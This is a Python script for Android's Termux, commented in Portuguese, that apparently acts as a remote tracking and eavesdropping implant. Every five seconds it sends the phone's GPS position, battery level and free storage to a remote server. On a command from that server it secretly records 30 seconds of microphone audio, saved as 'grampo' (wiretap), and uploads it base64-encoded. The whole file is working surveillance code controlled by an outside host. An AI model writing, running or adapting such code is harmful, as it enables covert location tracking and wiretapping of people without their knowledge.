import time
import subprocess
import json
import requests
import os
import base64
import uuid

URL_SERVIDOR = "https://nexos-t0to.onrender.com/update"
ARQUIVO_ID = os.path.expanduser("~/.nexos_device_id")
ARQUIVO_AUDIO = os.path.expanduser("~/grampo.wav")

def run_command(cmd):
    try: return subprocess.check_output(cmd, shell=True).decode().strip()
    except: return ""

def obter_ou_criar_id_unico():
    if os.path.exists(ARQUIVO_ID):
        with open(ARQUIVO_ID, "r") as f: return f.read().strip()
    novo_id = f"NX-{str(uuid.uuid4())[:6].upper()}"
    with open(ARQUIVO_ID, "w") as f: f.write(novo_id)
    return novo_id

DEVICE_ID = obter_ou_criar_id_unico()

print("\n" + "="*45)
print(f"🤖  SISTEMA ASSÍNCRONO NEXOS CORE ATIVADO!")
print(f"🔑  ID EXCLUSIVO DO APARELHO: {DEVICE_ID}")
print("="*45 + "\n")

# Variáveis de controle do cronômetro interno
gravando_agora = False
tempo_inicio_gravacao = 0

while True:
    # 1. COLETA DE DADOS CRUCIAL (Roda sempre, sem travar)
    battery = "N/A"
    out_bat = run_command("termux-battery-status")
    if out_bat:
        try: battery = str(json.loads(out_bat).get("percentage", "N/A"))
        except: pass
        
    storage = "N/A"
    out_df = run_command("df -h /data/data/com.termux/files/home")
    if out_df:
        try:
            lines = out_df.split("\n")
            if len(lines) > 1:
                parts = [p for p in lines[1].split(" ") if p]
                if len(parts) >= 3: storage = f"{parts[3]} livres"
        except: pass

    # Captura o GPS de forma ultra leve
    lat, lon = -16.6869, -49.2648
    out_loc = run_command("termux-location -p gps -r once")
    if out_loc:
        try:
            loc_data = json.loads(out_loc)
            lat = loc_data.get("latitude", lat)
            lon = loc_data.get("longitude", lon)
        except: pass

    # Prepara o pacote básico de transmissão
    payload = {
        "device_id": DEVICE_ID,
        "battery": battery,
        "storage": storage,
        "uptime": "Ativo",
        "lat": lat,
        "lon": lon,
        "audio_b64": ""
    }

    # 2. GERENCIAMENTO DE ÁUDIO NÃO-BLOQUEANTE
    tempo_atual = time.time()
    
    if gravando_agora:
        # Verifica se já se passaram os 30 segundos desde o início da gravação
        if tempo_atual - tempo_inicio_gravacao >= 30:
            print("⏱️ [CRONÔMETRO] 30 segundos concluídos. Finalizando áudio...")
            run_command("termux-microphone-record -q")
            gravando_agora = False
            
            # Codifica o arquivo que foi gravado em background
            if os.path.exists(ARQUIVO_AUDIO) and os.path.getsize(ARQUIVO_AUDIO) > 500:
                with open(ARQUIVO_AUDIO, "rb") as f:
                    payload["audio_b64"] = base64.b64encode(f.read()).decode('utf-8')
                print("✅ Enviando bloco de áudio completo para a nuvem!")
        else:
            print(f"🎙️ Gravando em background... Faltam {int(30 - (tempo_atual - tempo_inicio_gravacao))}s")

    # 3. TRANSMISSÃO CONSTANTE (Mantém o GPS vivo no site)
    try:
        response = requests.post(URL_SERVIDOR, json=payload, timeout=5)
        if response.status_code == 200:
            print(f"📡 Sinal GPS OK! [{lat}, {lon}] | Bateria: {battery}%")
            
            # CHECA SE CHEGOU UMA NOVA ORDEM DE GRAVAÇÃO
            dados_resposta = response.json()
            if dados_resposta.get("comando_gravacao") == True and not gravando_agora:
                print("🎙️ [ORDEM RECEBIDA] Disparando gravação em background por 30s...")
                run_command("termux-microphone-record -q")
                if os.path.exists(ARQUIVO_AUDIO): os.remove(ARQUIVO_AUDIO)
                
                # Inicia a gravação em segundo plano sem usar sleep
                subprocess.Popen(f"termux-microphone-record -f {ARQUIVO_AUDIO}", shell=True)
                gravando_agora = True
                tempo_inicio_gravacao = time.time()
                
    except Exception as e:
        print(f"❌ Erro de comunicação: {e}")

    # O ciclo agora roda rápido (a cada 5 segundos) garantindo atualizações instantâneas no mapa
    time.sleep(5)
